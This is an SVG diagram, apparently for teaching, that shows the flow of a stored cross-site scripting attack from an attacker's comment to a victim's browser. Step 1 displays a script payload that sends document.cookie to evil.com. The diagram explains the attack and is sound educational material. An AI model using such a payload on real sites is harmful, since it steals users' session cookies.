<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
  <!-- palette: resources/palette_diagram.yaml -->
  <rect x="32.2247" y="12.5491" width="1095.6378" height="627.4509" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
  <text x="580.0435" y="50.1961" text-anchor="middle" font-size="22.5883" font-weight="bold" fill="var(--text)">Stored XSS Attack Flow</text>
  <text x="64.4493" y="87.8432" font-size="15.0588" fill="var(--text-muted)">1. Attacker posts malicious comment:</text>
  <text x="88.6178" y="110.4314" font-size="13.8039" fill="var(--danger-accent)">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
  <rect x="64.4493" y="131.7647" width="193.3478" height="56.4706" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="161.1232" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Attacker</text>
  <rect x="370.5834" y="131.7647" width="209.4602" height="56.4706" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
  <text x="475.3134" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Web Server</text>
  <rect x="692.8297" y="131.7647" width="209.4602" height="56.4706" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="797.5599" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Database</text>
  <line x1="257.7971" y1="159.3726" x2="370.5834" y2="159.3726" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
  <line x1="580.0435" y1="159.3726" x2="692.8297" y2="159.3726" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#ar6)" />
  <text x="64.4493" y="232.1568" font-size="15.0588" fill="var(--text-muted)">2. Victim views the page with the comment</text>
  <line x1="797.5599" y1="188.2353" x2="797.5599" y2="263.5294" stroke="var(--primary-border)" stroke-width="1.8823" />
  <rect x="64.4493" y="263.5294" width="193.3478" height="69.0196" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
  <text x="161.1232" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Victim</text>
  <text x="161.1232" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">Browser</text>
  <rect x="370.5834" y="263.5294" width="209.4602" height="69.0196" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" />
  <text x="475.3134" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Web Server</text>
  <text x="475.3134" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">serves page</text>
  <rect x="692.8297" y="263.5294" width="209.4602" height="69.0196" rx="6" fill="var(--ok-fill)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="797.5599" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">Database</text>
  <text x="797.5599" y="313.7254" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">returns data</text>
  <line x1="370.5834" y1="297.4117" x2="257.7971" y2="297.4117" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
  <line x1="692.8297" y1="297.4117" x2="580.0435" y2="297.4117" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#ar6b)" />
  <text x="64.4493" y="376.4705" font-size="15.0588" fill="var(--text-muted)">3. Browser executes the script</text>
  <line x1="161.1232" y1="332.549" x2="161.1232" y2="401.5686" stroke="var(--danger-border)" stroke-width="1.8823" />
  <rect x="64.4493" y="401.5686" width="290.0218" height="69.0196" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="209.4602" y="430.4314" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="var(--text)">evil.com</text>
  <text x="209.4602" y="455.5294" text-anchor="middle" font-size="13.8039" fill="var(--text-muted)">receives session cookie</text>
  <text x="402.808" y="439.2157" font-size="15.0588" fill="var(--danger-accent)">4. Cookie sent to attacker</text>
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>

    <marker id="ar6" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="10" markerHeight="10" orient="auto-start-forward">
      <path d="M 0 0 L 17.7778 6.9231 L 0 13.8462 z" fill="#dc3545" />
    </marker>
    <marker id="ar6b" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="10" markerHeight="10" orient="auto-start-forward">
      <path d="M 0 0 L 17.7778 6.9231 L 0 13.8462 z" fill="#4a90e2" />
    </marker>
  </defs>
</svg>